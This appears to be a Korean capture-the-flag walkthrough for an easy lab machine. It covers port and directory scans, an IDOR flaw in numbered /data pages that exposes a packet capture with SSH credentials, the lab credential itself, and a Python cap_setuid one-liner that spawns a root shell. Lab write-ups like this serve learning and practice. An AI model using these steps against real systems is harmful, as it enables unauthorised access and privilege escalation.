
## By
- `Create`: 2021.07.25
- `Author`: jak010
- `Export IP`: 10.10.10.245
- `Level`: Easy


### Walk-Throught
 - 페이지를 하나씩 클릭하다보면 `IDOR` 이 가능한 링크가 보임
 	- `http://10.10.10.245/data/{0-9}[+]`
 - `http://10.10.10.245/data/0`에서 `pcap` 파일을 다운로드 할 수 있는 `ssh` 에 접속 가능한 `Credential`이 노출됨
 - `Root`권한을 얻기 위한 특정 바이너리는 안 보이므  `awesome-enumeration-tools` 를 이용 `python`에 `cap_setuid`가 걸려있는 걸 볼 수 있음


### Reconnaissnace && Enumeration
 - Nmap
 	```text
 	21/tcp open  ftp     vsftpd 3.0.3
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    gunicorn
 	```

 - Gobuster
	```text
	...
	[+] Url:                     http://10.10.10.245/
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
	...	
	/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
	/ip                   (Status: 200) [Size: 17462]                         
	/capture              (Status: 302) [Size: 220] [--> http://10.10.10.245/data/9]
	```


### Gaining Access
  - `http://{EXPORT_IP}/data/0`
	- `CREDENTIAL`
		- `nathan`:`Buck3tH4TF0RM3!`


### Priviliege Escalate
 - `GTFObins`
	- `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`